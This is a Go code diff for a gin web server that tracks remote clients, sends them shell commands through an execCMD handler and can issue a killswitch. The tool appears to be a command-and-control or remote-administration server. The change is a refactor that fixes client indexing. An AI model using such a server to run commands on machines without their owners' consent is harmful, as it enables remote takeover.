@@ -66,7 +66,7 @@ func saveClients(c *gin.Context) {
 	defer f.Close()
 	as_json, _ := json.MarshalIndent(jsonClients, "", "\t")
 	f.Write(as_json)
-	log.Println("SUCCESS!")
+	log.Println("Success!")
 }
 
 func removeClient(c *gin.Context) {
@@ -76,7 +76,7 @@ func removeClient(c *gin.Context) {
 		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
 		return
 	}
-	client, err := returnClient(intClientID)
+	client, id, err := returnClient(intClientID)
 	if err != nil {
 		return
 	}
@@ -89,7 +89,7 @@ func removeClient(c *gin.Context) {
 
 	log.Printf("Removing client %v\n", intClientID)
 	if len(clientList) != 1 {
-		clientList = append(clientList[:intClientID], clientList[intClientID+1:]...)
+		clientList = append(clientList[:id], clientList[id+1:]...)
 	} else {
 		clientList = nil
 	}
@@ -117,7 +117,7 @@ func getCommands(c *gin.Context) {
 		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
 		return
 	}
-	client, err := returnClient(intClientID)
+	client, _, err := returnClient(intClientID)
 	if err != nil {
 		c.String(http.StatusNotFound, "Client not found")
 		return
@@ -134,16 +134,20 @@ func sendKillswitch(c *gin.Context) {
 		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
 		return
 	}
+	_, id, err := returnClient(intClientID)
+	if err != nil {
+		return
+	}
 
-	if clientList[intClientID].IsOnline == false {
+	if clientList[id].IsOnline == false {
 		return
 	}
 
 	inst := Instructions{
 		IsKillswitch: true,
 	}
-	clientList[intClientID].Instruct(inst)
-	clientList[intClientID].IsOnline = false
+	clientList[id].Instruct(inst)
+	clientList[id].IsOnline = false
 }
 
 func execCMD(c *gin.Context) {
@@ -154,7 +158,7 @@ func execCMD(c *gin.Context) {
 		return
 	}
 
-	client, err := returnClient(idInt)
+	client, _, err := returnClient(idInt)
 	if err != nil {
 		return
 	}
@@ -166,7 +170,7 @@ func execCMD(c *gin.Context) {
 
 	command, _ := c.GetPostForm("cmd")
 
-	out, err := sendCommand(client, command)
+	out, err := sendCommand(*client, command)
 	if err != nil {
 		e := fmt.Sprintf("Error happened executing command: %v\n", err)
 		c.String(http.StatusOK, e)
